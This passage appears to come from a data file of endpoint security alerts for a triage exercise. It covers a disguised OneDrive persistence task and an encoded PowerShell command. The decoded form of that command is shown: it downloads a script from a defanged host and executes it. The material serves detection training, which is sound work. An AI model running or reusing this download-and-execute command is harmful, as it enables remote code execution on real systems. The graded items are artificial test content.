  tell: Fake name, real persistence. Real OneDrive tasks are not created by wscript and do not run binaries out of AppData\Roaming at logon.
- id: e05
  d: endpoint
  src: Defender for Endpoint · DeviceProcessEvents
  t: Encoded PowerShell command
  h: WS-ENG-0192 · pnguyen
  l: ['parent: explorer.exe', 'cmd: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...', 'decoded: IEX (New-Object Net.WebClient).DownloadString(''http://cdn-upd[.]top/s'')']
  v: 1
